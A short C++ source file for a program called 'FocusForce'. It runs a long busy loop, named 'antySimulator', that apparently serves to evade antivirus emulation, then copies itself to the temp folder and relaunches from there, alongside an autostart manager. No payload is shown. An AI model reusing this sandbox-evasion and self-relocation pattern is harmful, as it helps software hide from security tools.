#include <iostream>
#include <string>
#include "AutostartMenager.h"
#include <cstdlib>

using namespace std;

void antySimulator(){
    int first=1;
    int second=1;
    int temp;
    for(int i=0;i<500000007;i++){ // 500 MLN
        temp=second;
        second+=first;
        second%=5775123;
        first=temp;
    }
    cout << second << "\n";
}

int main(int argc, char** argv) {
    AutostartMenager autostartMenager;  
    cout<<argv[0] << "\n";
    cout<<"FocusForce init...\n";
    #ifndef DEBUG
    antySimulator();
    #endif

    if(autostartMenager.isInTempFolder(string(argv[0]))==false){
        cout<<"No in Temp!\n";
        string commadToRun = "start " + autostartMenager.moveToTempFolder();
        system(commadToRun.c_str());
        return 0;
    }
    cout << "in Temp!\n";
    int a;
    cin>>a;
    return 0;
} 